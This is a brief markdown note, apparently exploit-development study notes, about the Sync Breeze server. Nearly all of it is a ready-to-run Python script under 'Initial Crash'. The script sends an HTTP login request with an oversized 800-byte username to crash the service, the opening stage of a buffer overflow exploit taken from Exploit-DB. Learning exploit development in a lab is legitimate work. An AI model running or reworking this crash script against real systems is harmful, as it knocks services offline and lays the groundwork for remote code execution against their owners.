# Sync Breeze 

Downloaded from: https://www.exploit-db.com/exploits/42928

## Initial Crash

```py
#!/usr/bin/python 
import socket 
import sys 

server = "127.0.0.1" 
port = 80 
size = 800 

inputBuffer = b"A" * size 
content = b"username=" + inputBuffer + b"&password=A" 

buffer = b"POST /login HTTP/1.1\r\n" 
buffer += b"Host: " + server.encode() + b"\r\n" 
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" 
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
buffer += b"Referer: http://10.11.0.22/login\r\n" 
buffer += b"Connection: close\r\n" 
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n" 
buffer += b"\r\n" 
buffer += content 

print("Sending evil buffer...") 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
s.send(buffer) 
s.close() 

print("Done!") 
```
